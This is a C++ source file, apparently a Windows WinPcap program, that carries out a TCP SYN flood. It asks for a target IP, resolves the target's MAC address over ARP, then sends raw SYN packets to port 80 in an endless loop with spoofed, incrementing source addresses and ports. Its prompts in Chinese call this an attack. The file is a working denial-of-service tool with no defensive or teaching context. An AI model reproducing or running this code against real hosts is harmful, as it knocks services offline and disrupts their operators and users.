#include "main.h"


static volatile int keepRunning = 1;
int threadnum=1, maxthread=10;
//获取所有可用网卡
pcap_if_t* getDevs(void)
{
	pcap_if_t *alldevs;
	pcap_if_t *d;
	int i = 0;
	char errbuf[PCAP_ERRBUF_SIZE];

	/* 获取本地机器设备列表 */
	if (pcap_findalldevs_ex(const_cast<char*>(PCAP_SRC_IF_STRING), NULL /* auth is not needed */, &alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs_ex: %s\n", errbuf);
		exit(1);
	}

	return alldevs;
}
//通过输入数字找到选择设备
pcap_if_t* getDev(int i, pcap_if_t* alldevs)
{
	pcap_if_t *d = nullptr;
	for (d = alldevs; d != NULL; d = d->next)
	{
		--i;
		if (i == 0) break;
	}
	return d;
}
//验证ip格式
bool isValidIP(std::string ip) {
	std::string delim = ".";
	std::string ret[4];

	std::string::size_type loc = 0, start = 0;
	for (int i = 0; i<4; i++) {
		loc = ip.find(delim, start);
		if (loc != std::string::npos) {
			ret[i] = ip.substr(start, loc - start);
			start = loc + 1;
		}
		else if (i == 3) {
			ret[i] = ip.substr(start);
		}
		else {
			//格式不对，应该有3个. 
			return false;
		}
	}
	for (int i = 0; i<4; i++) {
		int num = atoi(ret[i].c_str());
		if (num>255) {
			return false;
		}
		else if ((num == 0) && (ret[i].compare("0"))) {
			return false;
		}
	}

	return true;
}





//处理ctrl+C 信号
void sig_handler(int sig)
{
	if (sig == SIGINT)
	{
		keepRunning = 0;
		std::cout << "攻击结束\n" << "\n";
	}
}

int main(int args,char* argv[])
{
	signal(SIGINT, sig_handler);//注册信号处理CTRL+C
	
	int choose = -1;//选择网卡
	pcap_if_t *alldevs = getDevs();
	int i = 0;//len of alldevs
	/* 打印列表 */
	for (pcap_if_t* d = alldevs; d != NULL; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0)
	{
		printf("\n没有找到可用的网卡\n");
		return 0;
	}

	std::cout << "请选择网卡：" << std::endl;
	while (true)
	{
		std::cin >> choose;
		if (choose > i || choose < 1)
		{
			std::cout << "超出选择范围了！\n"
				<< "请在 " << i << " 以内选择" << std::endl;
		}
		else break;
	}
	auto *dd = getDev(choose, alldevs);//获取选择的网卡设备
	std::cout << "您选择的网卡为:\n" <<dd->name << "\n";
	
	
	//验证IP
	std::cout << "请输入IP：" << std::endl;

	std::string ip;
	while (true)
	{
		std::cin >> ip;
		if (!isValidIP(ip))
		{
			std::cout << "IP格式不对！"<< std::endl;
		}
		else break;
	}
	std::cout << "您输入的IP为:\n" << ip << "\n";

	//getMacbyIp(ip);

	std::cout << "开始攻击\n" << ip << "\n";

	simpleDD(ip, dd->name);

	/* 不再需要设备列表了，释放它 */
	pcap_freealldevs(alldevs);
	system("pause");
	return 0;
}
//攻击func
void simpleDD(std::string ip,char* devName)
{
	const char * MYIP = "192.168.31.216";
	int port = 80;//攻击目标端口
	int SendSEQ = 0;
	unsigned long FakeIpNet, FakeIpHost;

	_EthHeader ethHeader;//物理帧头部
	IpHeader ipHeader;//IP头部
	_TcpHeader tcpHeader;//TCP头部
	PsdTcp psdTcp;//伪TCP头部 用来验证

	unsigned char  temp[6] = { 0 };
	
	
	getMacbyIp(ip,temp);//获取目标主机MAC地址 
	//unsigned char temp[6] = { 0xc4,0xca,0xd9,0xde,0xdc,0xf3 };
	memcpy(ethHeader.dMac, temp, 6);

	unsigned char temp2[6] = { 0x68,0xA3,0xC4,0xF2,0x5B,0xFF };
	memcpy(ethHeader.sMac, temp2, 6);
	ethHeader.type = 0x0008;
	

	FakeIpNet = inet_addr(ip.c_str());
	FakeIpHost = ntohl(FakeIpNet);

	ipHeader.VerAndH_length = 0x45;
	ipHeader.tos = 0;
	ipHeader.totalLength = htons(52);
	ipHeader.id = htons(2345);
	ipHeader.flagANDfrag = 0;//不分片  
	ipHeader.ttl = 0x80;
	ipHeader.type = 6;//TCP  
	ipHeader.cksum = 0;
	ipHeader.sIP = inet_addr(MYIP);
	ipHeader.dIP = inet_addr(ip.c_str());
	ipHeader.cksum = checksum((USHORT*)&ipHeader, sizeof(ipHeader));
	tcpHeader.sPort = htons(1095);
	tcpHeader.dPort = htons(port);
	tcpHeader.seq = 0xa5dd24ee;
	tcpHeader.ack = 0;
	tcpHeader.h_length = 32 << 2;
	tcpHeader.flag = 2;
	tcpHeader.wsize = htons(8192);
	tcpHeader.cksum = 0;
	tcpHeader.urgpoint = 0;
	byte tempdata[12] = { 0x02,0x04,0x05,0xb4,
		0x01,0x03,0x03,0x02,0x01,0x01,0x04,0x02 };
	memcpy(tcpHeader.options, tempdata, 12);
	psdTcp.sAddr = inet_addr(MYIP);
	psdTcp.dAddr = inet_addr(ip.c_str());
	psdTcp.type = 6;
	psdTcp.x = 0;
	psdTcp.dataLength = htons(32);
	UCHAR buf_tcp[100];
	int psdSize = sizeof(psdTcp);
	memcpy(buf_tcp, &psdTcp, psdSize);
	memcpy(buf_tcp + psdSize, &tcpHeader, sizeof(tcpHeader));
	psdSize += sizeof(tcpHeader);
	tcpHeader.cksum = checksum((USHORT*)buf_tcp, psdSize);


	u_char buf[100];
	


	while (keepRunning)
	{
		SendSEQ = (SendSEQ == 65536) ? 1 : SendSEQ + 1;
		
		

		ipHeader.cksum = 0;
		ipHeader.sIP = htonl(FakeIpHost + SendSEQ);
		tcpHeader.seq = htonl(SEQ + SendSEQ);
		tcpHeader.sPort = htons(SendSEQ);
		tcpHeader.cksum = 0;
		psdTcp.sAddr = ipHeader.sIP;
		//把TCP伪首部和TCP首部复制到同一缓冲区并计算TCP效验和  
		memcpy(buf, &psdTcp, sizeof(PsdTcp));
		memcpy(buf + sizeof(PsdTcp), &tcpHeader, sizeof(tcpHeader));
		tcpHeader.cksum = checksum((USHORT *)buf, sizeof(PsdTcp) + sizeof(tcpHeader));


		memcpy(buf, &ipHeader, sizeof(ipHeader));
		memcpy(buf + sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
		memset(buf + sizeof(ipHeader) + sizeof(tcpHeader), 0, 4);
		int dataSize = sizeof(ipHeader) + sizeof(tcpHeader);
		ipHeader.cksum = checksum((USHORT *)buf, dataSize);

		memset(buf, 0, dataSize);

		//填充数据包 头部 ethHeader ipHeader tcpHeader
		int len = 0;
		memcpy(buf, &ethHeader, sizeof(ethHeader));
		len += sizeof(ethHeader);
		memcpy(buf + len, &ipHeader, sizeof(ipHeader));
		len += sizeof(ipHeader);
		memcpy(buf + len, &tcpHeader, sizeof(tcpHeader));
		len += sizeof(tcpHeader);


		char err[1000];
		pcap_t * fp;
		fp = pcap_open(devName, 100, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, err);//通过设备name打开设备
		pcap_sendpacket(fp, buf, len);//发送数据包
		pcap_close(fp);
		InterlockedExchangeAdd((long *)&threadnum, -1);
	}
}


/*
通过发送arp包 通过IP获取目标主机MAC地址 用来填充以太头
*/
void getMacbyIp(std::string ip,unsigned char  (&mac)[6]/*传递数组地址*/ )
{
	HRESULT hr;
	IPAddr  ipAddr;
	ULONG   pulMac[2];
	ULONG   ulLen;
	char strMacAddr[100] = { 0 };
	ipAddr = inet_addr(ip.c_str());
	memset(pulMac, 0xff, sizeof(pulMac));
	ulLen = 6;

	hr = SendARP(ipAddr, 0, pulMac, &ulLen);//发送arp包

	if (hr != NO_ERROR)
	{
		printf("目标主机不在线!");
		exit(0);
	}
	//mac = (unsigned char *)pulMac;
	memcpy(mac, pulMac, sizeof mac);
	
	sprintf(strMacAddr, "%.2x-%.2x-%.2x-%.2x-%.2x-%.2x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	printf(strMacAddr);
}
